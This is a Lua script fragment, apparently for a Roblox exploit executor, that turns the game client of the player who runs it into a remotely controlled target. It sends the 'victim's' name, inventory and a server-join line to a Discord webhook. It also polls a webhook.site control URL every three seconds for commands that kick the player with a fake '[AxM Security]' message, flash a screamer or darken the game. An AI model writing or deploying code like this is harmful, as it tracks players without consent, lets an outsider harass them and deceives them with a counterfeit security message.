-- Функция отправки отчетов
local function sendLog(title, desc, color)
    pcall(function()
        local inv = ""
        for _, v in pairs(lp.Backpack:GetChildren()) do inv = inv .. "[" .. v.Name .. "] " end
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0x00ffff,
                ["fields"] = {
                    {["name"] = "👤 Жертва", ["value"] = lp.Name, ["inline"] = true},
                    {["name"] = "🎒 Вещи", ["value"] = "```" .. (inv ~= "" and inv or "Empty") .. "```"},
                    {["name"] = "🔗 Join Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
                }
            }}
        }
        local req = request or http_request or (syn and syn.request)
        if req then req({Url = log_webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
    end)
end

-- Чтение команд ИЗ ЧАТА Дискорда (через Webhook.site)
task.spawn(function()
    local last_msg = ""
    while task.wait(3) do -- Проверка каждые 3 секунды
        pcall(function()
            local response = game:HttpGet(control_url)
            -- Ищем текст сообщения в запросе
            if response ~= last_msg and response ~= "" then
                last_msg = response
                local cmd = string.lower(response)

                if string.find(cmd, "kick") then
                    local reason = string.match(cmd, "kick%s*%((.*)%)") or "Disconnected"
                    sendLog("💀 КИК ИЗ ЧАТА", "Причина: " .. reason, 0xff0000)
                    lp:Kick("\n[AxM Security]\n" .. reason)
                
                elseif string.find(cmd, "screamer") then
                    local g = Instance.new("ScreenGui", lp.PlayerGui)
                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1.5,0,1.5,0); i.Position = UDim2.new(-0.25,0,-0.25,0)
                    i.Image = "rbxassetid://15518663806"
                    local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
                    task.wait(0.5); g:Destroy()
                    sendLog("😱 СКРИМЕР ИЗ ЧАТА", "Выполнено", 0xffffff)

                elseif string.find(cmd, "horror") then
                    Lighting.ClockTime = 0
                    sendLog("🌑 УЖАС ИЗ ЧАТА", "Активировано", 0x000000)
                end
            end
        end)
    end
end)

